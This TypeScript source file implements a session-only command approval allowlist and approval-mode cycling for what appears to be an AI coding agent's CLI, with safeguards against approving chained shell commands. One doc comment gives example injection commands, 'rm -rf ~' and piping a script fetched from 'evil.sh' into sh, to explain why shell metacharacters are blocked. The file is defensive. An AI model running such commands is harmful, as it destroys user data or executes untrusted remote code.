/**
 * Session-only approval allowlist ("Always allow" this session).
 *
 * @remarks
 * Rules live in memory for the CLI process — they are never written to
 * disk. `runSkip` matches on a normalized command pattern (exact or
 * prefix); `keepUndo` matches on path. `planReview` cannot be allowlisted.
 */

import type { ApprovalRequest } from "../types.js";
import { getBridgeHooks } from "./state.js";
import { SHELL_METACHARACTER_PATTERN } from "../../fileProxy/constants.js";
import { CYCLE_MODES, type ApprovalMode } from "../../config/approvalMode.js";

export type {
  ApprovalMode,
  PersistedApprovalMode,
} from "../../config/approvalMode.js";
export {
  CYCLE_MODES,
  formatApprovalModeLabel,
  approvalModeDisplay,
  parseApprovalMode,
  parsePersistedApprovalMode,
} from "../../config/approvalMode.js";

/**
 * One allowlist rule. Session-scoped; not persisted.
 */
export type AllowlistRule =
  | { type: "runSkip"; pattern: string }
  | { type: "keepUndo"; path: string };

const normalize = (value: string): string =>
  value.trim().replace(/\s+/g, " ").toLowerCase();

/**
 * True when `command` matches an allowlisted `pattern`, exactly or as a
 * same-family prefix (e.g. `npm test` covers `npm test --watch`).
 *
 * @remarks
 * The prefix branch requires the *full* incoming command to contain no
 * shell metacharacter ({@link SHELL_METACHARACTER_PATTERN}) — otherwise
 * "always allow `npm test`" would also silently approve
 * `npm test && rm -rf ~` or `npm test; curl evil.sh | sh`, since both start
 * with the approved prefix. An exact repeat of a pattern that itself
 * contains a metacharacter still matches (nothing new was appended); only
 * *extending* such a command re-prompts.
 */
const commandMatches = (command: string, pattern: string): boolean => {
  const normalizedCommand = normalize(command);
  const normalizedPattern = normalize(pattern);
  if (normalizedPattern.length === 0) return false;
  if (normalizedCommand === normalizedPattern) return true;
  return (
    normalizedCommand.startsWith(`${normalizedPattern} `) &&
    !SHELL_METACHARACTER_PATTERN.test(normalizedCommand)
  );
};

/**
 * Builds an allowlist rule from an approval request, or `null` for types
 * that cannot be always-allowed (`planReview`).
 *
 * @param request - The request the user just always-allowed.
 * @returns A rule to store, or `null`.
 */
export const ruleFromRequest = (
  request: ApprovalRequest,
): AllowlistRule | null => {
  if (request.type === "runSkip") {
    return { type: "runSkip", pattern: request.command };
  }
  if (request.type === "keepUndo") {
    return { type: "keepUndo", path: request.contextLabel };
  }
  return null;
};

/**
 * In-memory allowlist consulted before opening the approval menu.
 */
export class SessionAllowlist {
  private readonly rules: AllowlistRule[] = [];

  /**
   * Adds a rule. Duplicates are ignored.
   *
   * @param rule - Command pattern or file path to auto-approve.
   */
  add = (rule: AllowlistRule): void => {
    if (this.matchesRule(rule)) return;
    this.rules.push(rule);
  };

  /**
   * True when `request` is covered by a stored rule.
   *
   * @param request - Incoming approval request.
   * @returns `false` for `planReview` and unmatched requests.
   */
  matches = (request: ApprovalRequest): boolean => {
    if (request.type === "planReview") return false;
    if (request.type === "runSkip") {
      return this.rules.some(
        (rule) =>
          rule.type === "runSkip" &&
          commandMatches(request.command, rule.pattern),
      );
    }
    return this.rules.some(
      (rule) =>
        rule.type === "keepUndo" &&
        normalize(rule.path) === normalize(request.contextLabel),
    );
  };

  /** Drops every rule (tests / new session). */
  clear = (): void => {
    this.rules.length = 0;
  };

  private matchesRule = (rule: AllowlistRule): boolean =>
    this.rules.some((existing) => {
      if (existing.type !== rule.type) return false;
      if (existing.type === "runSkip" && rule.type === "runSkip") {
        return normalize(existing.pattern) === normalize(rule.pattern);
      }
      if (existing.type === "keepUndo" && rule.type === "keepUndo") {
        return normalize(existing.path) === normalize(rule.path);
      }
      return false;
    });
}

/** Process-wide allowlist for this CLI session. */
export const sessionAllowlist = new SessionAllowlist();

let sessionApprovalMode: ApprovalMode = "default";

/**
 * Returns the current session approval mode.
 */
export const getApprovalMode = (): ApprovalMode => sessionApprovalMode;

/**
 * Sets the session approval mode (in-memory).
 *
 * @remarks
 * Notifies the Ink UI via `onApprovalModeChange` so the footer stays in
 * lockstep with Shift+Tab — the only way the mode ever changes.
 *
 * @param mode - Next mode.
 */
export const setSessionApprovalMode = (mode: ApprovalMode): void => {
  sessionApprovalMode = mode;
  getBridgeHooks().onApprovalModeChange?.(mode);
};

/**
 * Cycles `default → accept_edits → plan → auto → default`. While busy,
 * landing on `plan` is skipped in favor of `default` so a running task
 * cannot be switched into a mode that would strand it at confirm-plan —
 * `auto` has no such restriction, since it's useful for un-sticking a
 * stuck prompt mid-task.
 *
 * @param current - Mode before the keypress.
 * @param busy - Whether a task is in flight.
 * @returns The next mode.
 *
 * @example
 * ```ts
 * cycleApprovalMode("plan", true); // "auto" — plan's busy-skip doesn't apply here
 * cycleApprovalMode("auto", false); // "default"
 * ```
 */
export const cycleApprovalMode = (
  current: ApprovalMode,
  busy: boolean,
): ApprovalMode => {
  if (!CYCLE_MODES.includes(current)) {
    return "default";
  }
  const index = CYCLE_MODES.indexOf(current);
  let next = CYCLE_MODES[(index + 1) % CYCLE_MODES.length] ?? "default";
  if (busy && next === "plan") {
    next = "default";
  }
  return next;
};
